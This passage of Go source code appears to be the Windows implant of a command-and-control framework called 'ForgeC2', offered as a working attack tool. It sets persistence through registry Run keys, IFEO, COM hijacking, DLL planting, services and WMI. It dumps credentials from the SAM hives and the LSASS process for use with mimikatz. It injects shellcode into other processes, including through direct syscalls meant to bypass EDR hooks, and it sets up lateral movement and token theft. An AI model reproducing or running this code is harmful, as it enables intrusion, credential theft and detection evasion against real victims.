	key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, target)
	cmd := exec.Command("reg", "add", key, "/v", "Debugger", "/t", "REG_SZ", "/d", binaryPath, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("image_file: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("image_file: IFEO debugger set for %s -> %s", target, binaryPath)
}

func persistCOMHijack(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("com_hijack: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	clsid := "{B5F8350B-0548-4B5G-A625-EC63F3824F4E}"
	keyBase := fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid)
	cmds := [][]string{
		{"reg", "add", keyBase, "/f"},
		{"reg", "add", fmt.Sprintf(`%s\InprocServer32`, keyBase), "/ve", "/t", "REG_SZ", "/d", binaryPath, "/f"},
		{"reg", "add", fmt.Sprintf(`%s\InprocServer32`, keyBase), "/v", "ThreadingModel", "/t", "REG_SZ", "/d", "Apartment", "/f"},
	}
	for _, c := range cmds {
		rc := exec.Command(c[0], c[1:]...)
		applyHideWindow(rc)
		if out, err := rc.CombinedOutput(); err != nil {
			return fmt.Sprintf("com_hijack: reg step failed: %v %s", err, string(out))
		}
	}
	return fmt.Sprintf("com_hijack: CLSID %s -> %s", clsid, binaryPath)
}

func persistDLLHijack(args string) string {
	dllPath := args
	if dllPath == "" {
		return "dll_search_order: dll path required"
	}
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	hijackDir := filepath.Join(appData, "Microsoft", "Windows", "Caches")
	if err := os.MkdirAll(hijackDir, 0755); err != nil {
		return fmt.Sprintf("dll_search_order: mkdir failed: %v", err)
	}
	src, err := os.Open(dllPath)
	if err != nil {
		return fmt.Sprintf("dll_search_order: open src failed: %v", err)
	}
	defer src.Close()
	dst := filepath.Join(hijackDir, "version.dll")
	dstFile, err := os.Create(dst)
	if err != nil {
		return fmt.Sprintf("dll_search_order: create dst failed: %v", err)
	}
	defer dstFile.Close()
	if _, err := io.Copy(dstFile, src); err != nil {
		return fmt.Sprintf("dll_search_order: copy failed: %v", err)
	}
	return fmt.Sprintf("dll_search_order: planted DLL at %s", dst)
}

func listPersistence() string {
	var results []string
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}

	// Check registry Run key
	cmd := exec.Command("reg", "query", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2")
	applyHideWindow(cmd)
	if out, _ := cmd.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] Registry Run key (ForgeC2): found")
	} else {
		results = append(results, "[-] Registry Run key (ForgeC2): not found")
	}

	// Check scheduled task
	cmd2 := exec.Command("schtasks", "/query", "/tn", "ForgeC2Update", "/fo", "LIST")
	applyHideWindow(cmd2)
	if out, _ := cmd2.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] Scheduled task (ForgeC2Update): found")
	} else {
		results = append(results, "[-] Scheduled task (ForgeC2Update): not found")
	}

	// Check startup folder
	startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
	if _, err := os.Stat(startupPath); err == nil {
		results = append(results, "[+] Startup folder: forgec2.exe present")
	} else {
		results = append(results, "[-] Startup folder: forgec2.exe not found")
	}

	// Check WMI subscriptions
	psCmd := `Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "ForgeC2" } | Format-List | Out-String`
	cmd3 := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
	applyHideWindow(cmd3)
	if out, _ := cmd3.CombinedOutput(); len(strings.TrimSpace(string(out))) > 0 {
		results = append(results, "[+] WMI subscription (ForgeC2): found")
	} else {
		results = append(results, "[-] WMI subscription (ForgeC2): not found")
	}

	// Check service
	cmd4 := exec.Command("sc", "query", "ForgeC2Svc")
	applyHideWindow(cmd4)
	if out, _ := cmd4.CombinedOutput(); strings.Contains(string(out), "RUNNING") || strings.Contains(string(out), "STOPPED") {
		results = append(results, "[+] Service (ForgeC2Svc): found")
	} else {
		results = append(results, "[-] Service (ForgeC2Svc): not found")
	}

	// Check IFEO
	cmd5 := exec.Command("reg", "query", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/v", "Debugger")
	applyHideWindow(cmd5)
	if out, _ := cmd5.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] IFEO sethc.exe debugger: found")
	} else {
		results = append(results, "[-] IFEO sethc.exe debugger: not found")
	}

	// Check COM hijack
	cmd6 := exec.Command("reg", "query", `HKCU\Software\Classes\CLSID\{B5F8350B-0548-4B5G-A625-EC63F3824F4E}`)
	applyHideWindow(cmd6)
	if out, _ := cmd6.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] COM hijack CLSID: found")
	} else {
		results = append(results, "[-] COM hijack CLSID: not found")
	}

	return strings.Join(results, "\n")
}

func removePersistence(method string, args string) string {
	switch method {
	case "registry":
		cmd := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2", "/f")
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("registry remove: failed: %v %s", err, string(out))
		}
		return "registry: removed Run key"

	case "scheduled_task":
		cmd := exec.Command("schtasks", "/delete", "/tn", "ForgeC2Update", "/f")
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("scheduled_task remove: failed: %v %s", err, string(out))
		}
		return "scheduled_task: removed ForgeC2Update"

	case "startup_folder":
		appData := os.Getenv("APPDATA")
		if appData == "" {
			appData = os.Getenv("LOCALAPPDATA")
		}
		startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
		if err := os.Remove(startupPath); err != nil {
			return fmt.Sprintf("startup_folder remove: failed: %v", err)
		}
		return "startup_folder: removed startup file"

	case "wmi":
		psCmd := `$binding = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "ForgeC2" }; $binding | Remove-WmiObject; $filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object { $_.Name -match "ForgeC2" }; $filter | Remove-WmiObject; $consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -match "ForgeC2" }; $consumer | Remove-WmiObject; Write-Output "WMI persistence removed"`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("wmi remove: failed: %v %s", err, string(out))
		}
		return "wmi: removed event subscriptions"

	case "service":
		cmds := [][]string{
			{"sc", "stop", "ForgeC2Svc"},
			{"sc", "delete", "ForgeC2Svc"},
		}
		for _, c := range cmds {
			rc := exec.Command(c[0], c[1:]...)
			applyHideWindow(rc)
			rc.CombinedOutput()
		}
		return "service: removed ForgeC2Svc"

	case "image_file":
		cmd := exec.Command("reg", "delete", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/f")
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("image_file remove: failed: %v %s", err, string(out))
		}
		return "image_file: removed IFEO debugger"

	case "com_hijack":
		clsid := "{B5F8350B-0548-4B5G-A625-EC63F3824F4E}"
		cmd := exec.Command("reg", "delete", fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid), "/f")
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("com_hijack remove: failed: %v %s", err, string(out))
		}
		return "com_hijack: removed CLSID"

	case "dll_search_order":
		appData := os.Getenv("APPDATA")
		if appData == "" {
			appData = os.Getenv("LOCALAPPDATA")
		}
		hijackPath := filepath.Join(appData, "Microsoft", "Windows", "Caches", "version.dll")
		if err := os.Remove(hijackPath); err != nil {
			return fmt.Sprintf("dll_search_order remove: failed: %v", err)
		}
		return "dll_search_order: removed hijack DLL"

	default:
		return fmt.Sprintf("unknown persistence method: %s", method)
	}
}

// Registry using reg.exe for simplicity and reliability (no extra deps)
func regGetWindows(key string) (string, error) {
	cmd := exec.Command("reg", "query", key, "/s")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("reg query failed: %s", string(out))
	}
	return string(out), nil
}

func regSetWindows(path, data string) error {
	// data format: "REG_SZ|value" or "REG_DWORD|123"
	parts := strings.SplitN(data, "|", 2)
	if len(parts) != 2 {
		return fmt.Errorf("data format: TYPE|value e.g. REG_SZ|hello")
	}
	typ := parts[0]
	val := parts[1]

	cmd := exec.Command("reg", "add", path, "/ve", "/t", typ, "/d", val, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg add failed: %s", string(out))
	}
	return nil
}

func regDeleteWindows(key string) error {
	cmd := exec.Command("reg", "delete", key, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg delete failed: %s", string(out))
	}
	return nil
}

// --- Creds dump (3) ---

func dumpCreds() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("creds only on windows")
	}
	var out strings.Builder
	out.WriteString("=== Credential Dump Attempt ===\n")

	// 1. Reg save for offline attack (SAM/SYSTEM/SECURITY)
	tmp := os.Getenv("TEMP")
	if tmp == "" {
		tmp = "C:\\Windows\\Temp"
	}
	samPath := filepath.Join(tmp, "sam.save")
	sysPath := filepath.Join(tmp, "system.save")
	secPath := filepath.Join(tmp, "security.save")

	// Need admin usually
	cmds := []struct{ name, c string }{
		{"SAM", fmt.Sprintf(`reg save HKLM\SAM "%s" /y`, samPath)},
		{"SYSTEM", fmt.Sprintf(`reg save HKLM\SYSTEM "%s" /y`, sysPath)},
		{"SECURITY", fmt.Sprintf(`reg save HKLM\SECURITY "%s" /y`, secPath)},
	}
	for _, c := range cmds {
		rcmd := exec.Command("cmd", "/c", c.c)
		applyHideWindow(rcmd)
		if r, err := rcmd.CombinedOutput(); err == nil {
			out.WriteString(fmt.Sprintf("[+] %s saved: %s\n", c.name, c.c))
		} else {
			out.WriteString(fmt.Sprintf("[-] %s failed: %v %s\n", c.name, err, string(r)))
		}
	}

	// 2. LSASS minidump via comsvcs.dll (classic, works from high integrity often)
	// Find lsass pid
	lsassPID := uint32(0)
	if p, err := findPIDByName("lsass.exe"); err == nil {
		lsassPID = p
	} else {
		// fallback via tasklist
		tcmd := exec.Command("cmd", "/c", "for /f \"tokens=2\" %i in ('tasklist /fi \"imagename eq lsass.exe\" /nh') do @echo %i")
		applyHideWindow(tcmd)
		if t, _ := tcmd.Output(); len(t) > 0 {
			if pid, _ := strconv.ParseUint(strings.TrimSpace(string(t)), 10, 32); pid > 0 {
				lsassPID = uint32(pid)
			}
		}
	}
	if lsassPID > 0 {
		dumpPath := filepath.Join(tmp, "lsass.dmp")
		// rundll32 comsvcs MiniDump (pid) (dumpfile) full
		dcmd := exec.Command("rundll32.exe", "C:\\Windows\\System32\\comsvcs.dll, MiniDump", fmt.Sprintf("%d", lsassPID), dumpPath, "full")
		applyHideWindow(dcmd)
		if d, err := dcmd.CombinedOutput(); err == nil {
			out.WriteString(fmt.Sprintf("[+] LSASS minidump: %s (pid=%d)\n", dumpPath, lsassPID))
			// Optionally include size info; do not b64 entire dump here (too big). User downloads.
			if fi, err := os.Stat(dumpPath); err == nil {
				out.WriteString(fmt.Sprintf("    size=%d bytes\n", fi.Size()))
			}
		} else {
			out.WriteString(fmt.Sprintf("[-] LSASS dump failed (often requires admin/SeDebug): %v %s\n", err, string(d)))
		}
	} else {
		out.WriteString("[-] Could not locate lsass pid\n")
	}

	out.WriteString("\nFiles written to %TEMP% (use 'download' task or exfil):\n")
	out.WriteString("  - sam.save / system.save / security.save\n")
	out.WriteString("  - lsass.dmp (feed to mimikatz: sekurlsa::minidump + sekurlsa::logonpasswords)\n")
	out.WriteString("Note: run from high integrity / SYSTEM for best results.\n")
	return out.String(), nil
}

// --- Inject (4) multiple techniques ---

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	tech = strings.ToLower(strings.TrimSpace(tech))
	if tech == "" {
		tech = "createremotethread"
	}

	// Open target with necessary rights
	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
	if hProc == 0 {
		// try all access
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return fmt.Errorf("OpenProcess failed for pid %d (check privs)", pid)
	}
	defer procCloseHandle.Call(hProc)

	switch tech {
	case "createremotethread", "crt", "remote":
		return doCreateRemoteThread(hProc, shellcode)
	case "apc", "queueapc":
		return doQueueUserAPC(hProc, pid, shellcode)
	case "earlybird":
		return doEarlyBird(hProc, pid, shellcode)
	case "ntcreatethreadex", "ntct", "nt":
		return doNtCreateThreadEx(hProc, shellcode)
	case "ntcreatethreadex_indirect", "ntcti", "nti":
		return doNtCreateThreadExIndirect(hProc, shellcode)
	case "threadless", "tl":
		return doThreadlessInject(hProc, pid, shellcode)
	case "syscall", "hellsgate", "direct":
		return doSyscallInject(hProc, shellcode)
	case "indirect":
		return doNtCreateThreadExIndirect(hProc, shellcode)
	default:
		return doCreateRemoteThread(hProc, shellcode)
	}
}

func doCreateRemoteThread(hProc uintptr, sc []byte) error {
	// VirtualAllocEx
	addr, _, _ := procVirtualAllocEx.Call(
		hProc,
		0,
		uintptr(len(sc)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}

	// WriteProcessMemory
	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProc,
		addr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}

	// CreateRemoteThread
	thread, _, _ := procCreateRemoteThread.Call(
		hProc,
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		return fmt.Errorf("CreateRemoteThread failed")
	}
	procCloseHandle.Call(thread)
	return nil
}

func doQueueUserAPC(hProc uintptr, pid uint32, sc []byte) error {
	// Allocate + write in target
	addr, _, _ := procVirtualAllocEx.Call(hProc, 0, uintptr(len(sc)), uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_EXECUTE_READWRITE))
	if addr == 0 {
		return fmt.Errorf("alloc failed")
	}
	var w uintptr
	procWriteProcessMemory.Call(hProc, addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), uintptr(unsafe.Pointer(&w)))

	// Find a thread in the process to queue APC to
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return fmt.Errorf("thread snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))
	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			hThread, _, _ := procOpenThread.Call(THREAD_SUSPEND_RESUME|0x0010 /*THREAD_SET_CONTEXT?*/, 0, uintptr(te.th32ThreadID))
			if hThread != 0 {
				// Queue APC
				procQueueUserAPC.Call(addr, hThread, 0)
				procCloseHandle.Call(hThread)
				return nil // queued to first thread found
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Errorf("no suitable thread for APC")
}

// Simplified early bird: alloc in target (assume already have h, for demo we do basic suspended not fully here)
// For full would CreateProcess suspended + apc to main thread. Here we approximate via existing pid.
func doEarlyBird(hProc uintptr, pid uint32, sc []byte) error {
	// Same as APC for now (real earlybird needs createproc control)
	return doQueueUserAPC(hProc, pid, sc)
}

// ── Hell's Gate Syscall Injection (direct syscall, bypasses user-mode hooks) ──

// findSyscallNum locates the syscall number (SSN) for a given function in ntdll
func findSyscallNum(funcName string) (uint32, error) {
	modName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(modName)))
	if hMod == 0 {
		return 0, fmt.Errorf("GetModuleHandle(ntdll) failed")
	}
	base := hMod

	dos := (*imageDOSHeader)(unsafe.Pointer(base))
	if dos.eMagic != 0x5A4D {
		return 0, fmt.Errorf("invalid DOS header")
	}

	ntHdr := (*imageNTHeaders64)(unsafe.Pointer(base + uintptr(dos.eLfanew)))
	if ntHdr.signature != 0x00004550 {
		return 0, fmt.Errorf("invalid PE signature")
	}

	exportDir := &ntHdr.optionalHeader.dataDirectory[0]
	if exportDir.virtualAddress == 0 {
		return 0, fmt.Errorf("no export directory")
	}
	exp := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportDir.virtualAddress)))

	funcArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfFunctions)))
	nameArray := (*[1 << 20]uint32)(unsafe.Pointer(base + uintptr(exp.addressOfNames)))
	ordArray := (*[1 << 16]uint16)(unsafe.Pointer(base + uintptr(exp.addressOfNameOrdinals)))

	for i := uint32(0); i < exp.numberOfNames; i++ {
		namePtr := base + uintptr(nameArray[i])
		var name string
		for j := 0; ; j++ {
			c := *(*byte)(unsafe.Pointer(namePtr + uintptr(j)))
			if c == 0 {
				break
			}
			name += string(c)
		}
		if name == funcName {
			ord := ordArray[i]
			funcRVA := funcArray[ord]
			funcAddr := base + uintptr(funcRVA)

			code := (*[32]byte)(unsafe.Pointer(funcAddr))[:]
			// Look for pattern: B8 XX XX XX XX (mov eax, SSN) with syscall (0F 05) nearby
			for k := 0; k < len(code)-5; k++ {
				if code[k] == 0xB8 {
					ssn := uint32(code[k+1]) | uint32(code[k+2])<<8 | uint32(code[k+3])<<16 | uint32(code[k+4])<<24
					for j := k + 5; j < len(code)-1 && j <= k+16; j++ {
						if code[j] == 0x0F && code[j+1] == 0x05 {
							return ssn, nil
						}
					}
				}
			}
			return 0, fmt.Errorf("syscall pattern not found in %s", funcName)
		}
	}
	return 0, fmt.Errorf("export %s not found in ntdll", funcName)
}

// buildSyscallStub allocates executable memory with a direct syscall gadget: mov r10,rcx; mov eax,SSN; syscall; ret
func buildSyscallStub(ssn uint32) (uintptr, error) {
	code := []byte{
		0x4C, 0x8B, 0xD1,
		0xB8, byte(ssn), byte(ssn >> 8), byte(ssn >> 16), byte(ssn >> 24),
		0x0F, 0x05,
		0xC3,
	}
	addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc for syscall stub failed")
	}
	for i := 0; i < len(code); i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = code[i]
	}
	return addr, nil
}

// doSyscallInject uses direct NT syscalls (Hell's Gate) to inject shellcode.
// Bypasses user-mode hooks on NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory.
// Thread creation is done via CreateRemoteThread (which is rarely hooked when allocation/write are clean).
func doSyscallInject(hProc uintptr, sc []byte) error {
	// Find syscall numbers for the critical memory APIs
	ntAllocVM, err := findSyscallNum("NtAllocateVirtualMemory")
	if err != nil {
		return fmt.Errorf("syscall find: %w", err)
	}
	ntWriteVM, err := findSyscallNum("NtWriteVirtualMemory")
	if err != nil {
		return fmt.Errorf("syscall find: %w", err)
	}
	ntProtectVM, err := findSyscallNum("NtProtectVirtualMemory")
	if err != nil {
		return fmt.Errorf("syscall find: %w", err)
	}

	// Build syscall stubs
	stubAlloc, err := buildSyscallStub(ntAllocVM)
	if err != nil {
		return fmt.Errorf("build stub: %w", err)
	}
	defer procVirtualFree.Call(stubAlloc, 0, 0x8000)

	stubWrite, err := buildSyscallStub(ntWriteVM)
	if err != nil {
		return fmt.Errorf("build stub: %w", err)
	}
	defer procVirtualFree.Call(stubWrite, 0, 0x8000)

	stubProtect, err := buildSyscallStub(ntProtectVM)
	if err != nil {
		return fmt.Errorf("build stub: %w", err)
	}
	defer procVirtualFree.Call(stubProtect, 0, 0x8000)

	// NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
	var allocAddr uintptr
	regionSize := uintptr(len(sc))
	r1, _, _ := syscall.Syscall6(stubAlloc, 6,
		hProc,
		uintptr(unsafe.Pointer(&allocAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", r1)
	}

	// NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten)
	var written uint32
	r1, _, _ = syscall.Syscall6(stubWrite, 5,
		hProc,
		allocAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
		0,
	)
	if r1 != 0 {
		syscall.Syscall6(stubAlloc, 4, hProc, uintptr(unsafe.Pointer(&allocAddr)), 0, regionSize, 0x8000, 0)
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", r1)
	}

	// NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
	var oldProt uint32
	r1, _, _ = syscall.Syscall6(stubProtect, 5,
		hProc,
		uintptr(unsafe.Pointer(&allocAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProt)),
		0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", r1)
	}

	// CreateRemoteThread via standard API (not hooked by EDR in most cases)
	thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, allocAddr, 0, 0, 0)
	if thread == 0 {
		return fmt.Errorf("CreateRemoteThread failed (shellcode is in memory at 0x%X)", allocAddr)
	}
	procWaitForSingleObject.Call(thread, 0xFFFFFFFF)
	procCloseHandle.Call(thread)
	return nil
}

// --- Spawn: Create suspended process, inject shellcode, resume ---

func spawnProcess(targetExe string, shellcode []byte, technique string) string {
	if len(shellcode) == 0 {
		return "empty shellcode"
	}
	if targetExe == "" {
		targetExe = "rundll32.exe"
	}

	exePath := targetExe
	if !strings.Contains(targetExe, "\\") {
		envStr, _ := syscall.UTF16PtrFromString("%windir%\\system32\\" + targetExe)
		var buf [260]uint16
		procExpandEnvironmentStringsW.Call(
			uintptr(unsafe.Pointer(envStr)),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
		)
		exePath = syscall.UTF16ToString(buf[:])
		if exePath == "" {
			exePath = "C:\\Windows\\system32\\" + targetExe
		}
	}

	exePathPtr, _ := syscall.UTF16PtrFromString(exePath)

	var si startupInfoExW
	si.cb = uint32(unsafe.Sizeof(si))
	si.dwFlags = 0x00000001 // STARTF_USESHOWWINDOW
	si.wShowWindow = 0      // SW_HIDE

	var pi processInformation

	ret, _, _ := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(exePathPtr)),
		0,
		0,
		0,
		0,
		uintptr(createSuspended),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Sprintf("CreateProcessW failed for %s", exePath)
	}

	hProc := pi.hProcess

	addr, _, _ := procVirtualAllocEx.Call(
		hProc,
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if addr == 0 {
		procTerminateProcess.Call(hProc, 1)
		procCloseHandle.Call(hProc)
		procCloseHandle.Call(pi.hThread)
		return "VirtualAllocEx failed"
	}

	var written uintptr
	ret2, _, _ := procWriteProcessMemory.Call(
		hProc,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret2 == 0 {
		procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
		procTerminateProcess.Call(hProc, 1)
		procCloseHandle.Call(hProc)
		procCloseHandle.Call(pi.hThread)
		return "WriteProcessMemory failed"
	}

	tech := strings.ToLower(strings.TrimSpace(technique))
	if tech == "" || tech == "createremotethread" || tech == "crt" || tech == "remote" {
		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
		if thread == 0 {
			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
			procTerminateProcess.Call(hProc, 1)
			procCloseHandle.Call(hProc)
			procCloseHandle.Call(pi.hThread)
			return "CreateRemoteThread failed"
		}
		procCloseHandle.Call(thread)
	} else if tech == "queueuserapc" || tech == "apc" {
		ret3, _, _ := procQueueUserAPC.Call(addr, pi.hThread, 0)
		if ret3 == 0 {
			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
			procTerminateProcess.Call(hProc, 1)
			procCloseHandle.Call(hProc)
			procCloseHandle.Call(pi.hThread)
			return "QueueUserAPC failed"
		}
	} else {
		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
		if thread == 0 {
			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
			procTerminateProcess.Call(hProc, 1)
			procCloseHandle.Call(hProc)
			procCloseHandle.Call(pi.hThread)
			return "CreateRemoteThread failed"
		}
		procCloseHandle.Call(thread)
	}

	procResumeThread.Call(pi.hThread)
	procCloseHandle.Call(pi.hThread)
	procCloseHandle.Call(hProc)

	return fmt.Sprintf("spawned pid %d", pi.dwProcessID)
}

// --- Lateral movement (6) ---

func lateralMove(spec string) (string, error) {
	parts := strings.SplitN(spec, "|", 5)
	if len(parts) < 3 {
		return "", fmt.Errorf("format: type|target|user|pass|cmd (user/pass optional for some)")
	}
	typ := strings.ToLower(strings.TrimSpace(parts[0]))
	target := strings.TrimSpace(parts[1])
	user := ""
	pass := ""
	cmd := ""
	if len(parts) > 2 {
		user = strings.TrimSpace(parts[2])
	}
	if len(parts) > 3 {
		pass = strings.TrimSpace(parts[3])
	}
	if len(parts) > 4 {
		cmd = strings.TrimSpace(parts[4])
	}
	if cmd == "" {
		cmd = "whoami"
	}

	switch typ {
	case "wmi", "wmiexec":
		return lateralWMI(target, user, pass, cmd)
	case "winrm", "psremoting":
		return lateralWinRM(target, user, pass, cmd)
	case "psexec", "smbexec", "psexec-like":
		return lateralPsexec(target, user, pass, cmd)
	case "dcom":
		return lateralDCOM(target, user, pass, cmd)
	default:
		return lateralWMI(target, user, pass, cmd)
	}
}

// --- SOCKS5 (1) - working local proxy for pivoting ---

// Minimal SOCKS5 server. Listens and relays.
// Operator can use on the compromised host's network if reachable, or combine with port forwards.
// For full C2-relayed socks (CS style), the server would open local port and ferry bytes via special beacon tasks.
// This impl gives immediate value.

// ============================================================
// TOKEN IMPERSONATION SUBSYSTEM
// ============================================================
// Provides Cobalt Strike "steal_token" / "make_token" parity:
//   token_list_procs  - enumerate processes with their token user info
//   token_steal  <pid>          - duplicate & impersonate token from pid
//   token_make   <domain\user> <password> [logon_type] - LogonUser + ImpersonateLoggedOnUser
//   token_revert / rev2self     - RevertToSelf
//   token_whoami                - return current impersonated identity
//
// All operate on the current thread's impersonation context.
// ============================================================

var (
	// advapi32 procs for token operations
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	procOpenProcessToken          = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx          = advapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser   = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf              = advapi32.NewProc("RevertToSelf")
	procGetTokenInformation       = advapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW         = advapi32.NewProc("LookupAccountSidW")
	procLogonUserW                = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUserFn = advapi32.NewProc("ImpersonateLoggedOnUser")
)

const (
	TOKEN_DUPLICATE           = 0x0002
	TOKEN_IMPERSONATE         = 0x0004
	TOKEN_QUERY               = 0x0008
	TOKEN_ALL_ACCESS_TOKEN    = 0xF01FF
	TokenUser                 = 1
	TokenIntegrityLevel       = 25
	TokenType_Token           = 8
	SecurityImpersonation     = 2
	TokenImpersonation        = 2
	TokenPrimary              = 1
	LOGON32_LOGON_INTERACTIVE = 2
	LOGON32_LOGON_NETWORK     = 3
	LOGON32_PROVIDER_DEFAULT  = 0
)

// tokenInfoResult carries token metadata extracted from a process
type tokenInfoResult struct {
	PID         uint32
	ProcessName string
	Domain      string
	Username    string
	Integrity   string
	TokenType   string
	Error       string
}

// getCurrentTokenUser returns the current impersonated identity (after steal or make_token)
